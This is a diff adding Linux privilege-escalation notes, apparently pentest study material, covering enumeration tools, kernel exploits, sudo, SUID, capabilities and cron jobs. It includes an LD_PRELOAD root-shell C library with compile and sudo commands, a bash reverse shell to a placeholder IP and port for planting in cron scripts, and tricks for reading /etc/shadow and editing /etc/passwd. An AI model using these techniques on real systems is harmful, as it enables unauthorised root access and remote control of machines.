@@ -97,3 +97,98 @@ Find development tools and supported languages:
 
 Find specific file permissions:
 - `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
+
+## Automated Enumeration Tools
+- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
+- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
+- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
+
+## Kernel Exploits
+The kernel on linux systems manages the communication between components such as the memory on the system and applications. This function requieres the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.
+The process is as simple as:
+- Identify the kernel version (`uname -r`)
+- Search and find an exploit code for the kernel version
+- Run it
+- Profit
+
+Although simple it varies from version to version and **_A failed kernel exploit can lead to a system crash_**. So please read things through before doing anything stupid.
+
+## Sudo
+The sudo command, by default, allows us to run a program with root privileges. Under some conditions, system admins may need to give users some flexibility on their privileges. Any user can check its current situation related to root privileges using the `sudo -l` command.
+[GTFObins](https://gtfobins.github.io/) is a valuable source that provides information on how any program on which we may have sudo rights can be potentially used to escalate.
+
+### Leverage application functions
+In some applications we would be able to use certain functions of those applications to not only be able to escalate but also read, write or execute certain programs which normally we wouldn't have access. 
+One example is the **Apache2 server**. We can leverage an option of the application (`-f file`) that supports loading alternative config files. When loading a file such as `/etc/shadow` it will result in an error message that includes the first line of the file.
+
+### Leverage LD_PRELOAD
+On some systems, we may see the `LD_PRELOAD` environment option when doing `sudo -l`. This is a function that allows any program to use shared libraries. If the `env_keep `option is enabled we can generate a shared library which will be loaded and executed before the program is run. Note that the `LD_PRELOAD` option will be ignored if the real user ID is different from the effective user ID. For a sick blog post with explanation and stuff pls refer to [sick blog post.](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) 
+A quick step guide to do this goes as follows:
+- Check for LD_PRELOAD (with the env_keep option)
+- Write a simple C code compiled as a share object (.so) file
+- Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
+
+An example of a simple C code to gain root can be:
+```C
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+We can then save this code with a .c extension and compile it using `gcc` into a shared object file using the following
+```sh
+gcc -fPIC -shared shell.c -nostartfiles -o shell.so
+```
+Finally we can use this shared object when launching any program our user can run with sudo, we just need to run the program by specifying the LD_PRELOAD option as follows:
+```sh
+sudo LD_PRELOAD=/path/to/file/shell.so COMMAND
+```
+This will result in a shell spawn with root privileges
+
+## SUID
+Much of linux privilege controls rely on controlling the users and files interactions. These privilege levels change with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.
+These files have an "s" bit set showing their special permission level, we can find them with
+```sh
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+will list files that have SUID or SGID bits set. 
+A good practice would be to compare executables on this list with [GTFObins](https://gtfobins.github.io/) and filtering by SUID so it only shows binaries known to be exploitable when the SUID bit is set.
+
+From here the procedure depends on which commands are available for us to use. One way for example could be to [[Unshadow]] and use [[John The Ripper]] to try and get the plain text passwords. Or To add a new user with hopefully root privileges by using [[Openssl]] to create the hash of a new password and then add it into the `/etc/passwd` file.
+
+## Capabilities
+Another method system administrators can use to increase the privilege level of a process or binary is through Capabilities. These can help manage privileges at a more granular level, if an administrator doesn't want to give a user higher privileges, they can change the capabilities of a binary to allow it to get trough its task without needing a higher privilege user. 
+We can see which binaries have enabled capabilities by using
+```sh
+getcap -r / 2>/dev/null
+```
+Which would result in all the binaries with have capabilities, we are specially interested in the ones with `cap_setuid` as these can often result in escalation. For methodology refer to [GOATbins](https://gtfobins.github.io/). Even though these programs have the SUID capability, they may not have the SUID bit enabled, so they will not appear when enumerating for SUID.
+
+## Cron Jobs
+Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions. The idea being, if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.
+
+Each user on the system has their crontab file and can run specific tasks whether they are logged in or not. Any user can read the file keeping system-wide cron jobs under `/etc/crontab`. 
+Here we can find every cron job configured by a user. We can then go and check those scripts to see if the can be modified in any way to instead run code that will allow us to escalate. The scripts will have to use the tools available on the target system. Some things to note:
+- The command syntax will vary depending on the available tools (maybe we won't be able to use `nc` as it may not support the `-e` option)
+- We should always prefer to start reverse shells, as we do not want to compromise the system integrity during a real pentest.
+
+An example of a reverse shell for a .sh file would be something like
+```sh
+#!/bin/bash
+bash -i >& /dev/tcp/IP/PORT 0>&1
+```
+NOTE: remember to check if the file can be executed. If not we can use
+```sh
+chmod +x FILE
+```
+to make it so it can be ran.
+
+Another case, although similar, is if a old cron job is still set up, in this case the original file could have been removed, if so we can create a new file in the original path so that the new file is executed with the reverse shell
